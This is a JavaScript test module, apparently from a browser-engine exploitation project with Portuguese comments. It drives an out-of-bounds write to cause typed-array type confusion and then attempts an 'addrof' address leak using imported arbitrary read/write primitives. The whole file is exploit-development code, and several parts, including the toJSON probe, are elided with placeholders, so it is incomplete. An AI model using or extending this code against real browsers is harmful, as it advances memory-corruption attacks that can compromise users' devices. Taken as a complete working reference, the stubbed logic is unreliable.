// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R18)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read, 
    arb_write, 
    oob_write_absolute, 
    attemptAddrofUsingCoreHeisenbug // Usará a versão R18 de core_exploit.mjs
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R18() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt (R18) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R18...`;

    let iteration_results_summary = [];
    let best_result_for_runner = { /* ... (como na R17) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_A_result_getter_tc_probe: { success: false, msg: "Addrof (Getter TC Probe R18): Not set.", value: null }, 
        addrof_A_result_core_func: { success: false, msg: "Addrof (CoreExploit Func R18): Not set.", value: null, raw_double: null }, 
        addrof_B_result_direct_prop_tc_probe: { success: false, msg: "Addrof (Direct Prop TC Probe R18): Not set.", value: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R18: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        // ... (Variáveis locais da iteração como na R17) ...
        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 
        const current_object_to_leak_A = { marker_A_R18: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R18: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };

        // Sonda toJSON (para Fase 1 TC) - Lógica como na R17
        function toJSON_TA_Probe_Iter_Closure_R18() { /* ... */ } 
        // (Implementação da sonda omitida por brevidade, é a mesma da R17 com logs atualizados para R18)


        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof (TC Probe R18): Default", value: null };
        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof (R18): Default", value: null, raw_double: null };
        let iter_addrof_direct_result = { success: false, msg: "Direct Prop (TC Probe R18): Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try { 
            // Fase 1: Detecção da TC (lógica como na R17)
            logS3(`  --- Fase 1 (R18): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            // ... (resto da Fase 1 como na R17, usando toJSON_TA_Probe_Iter_Closure_R18) ...
             logS3(`  --- Fase 1 (R18) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);

            // Fase 2: Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug
            logS3(`  --- Fase 2 (R18): Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest", FNAME_CURRENT_ITERATION);
            try {
                const core_addrof_res = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A); // Usa a R18 do core_exploit
                logS3(`  Addrof Core R18: Resultado: ${JSON.stringify(core_addrof_res)}`, "leak", FNAME_CURRENT_ITERATION);
                if(core_addrof_res){ /* ... (lógica de análise como na R17, adaptando logs para R18) ... */ }
                else{iter_addrof_core_result.msg="Core Addrof R18: retornou nulo/inválido.";}
            }catch(e_core_addr){/* ... */}
            logS3(`  --- Fase 2 (R18) Concluída. Addrof Core Sucesso: ${iter_addrof_core_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer;}finally{clearOOBEnvironment({force_clear_even_if_not_setup:true});}

        final_probe_call_count_for_report = probe_call_count_iter;
        let current_iter_summary = { /* ... */ }; 
        iteration_results_summary.push(current_iter_summary);
        // Lógica de best_result_for_runner (como na R17)
        // ...
        if(iter_addrof_core_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: AddrofCore OK!`;
        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R18): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { /* ... (como na R17, atualizando para nomes R18) ... */ }; 
}
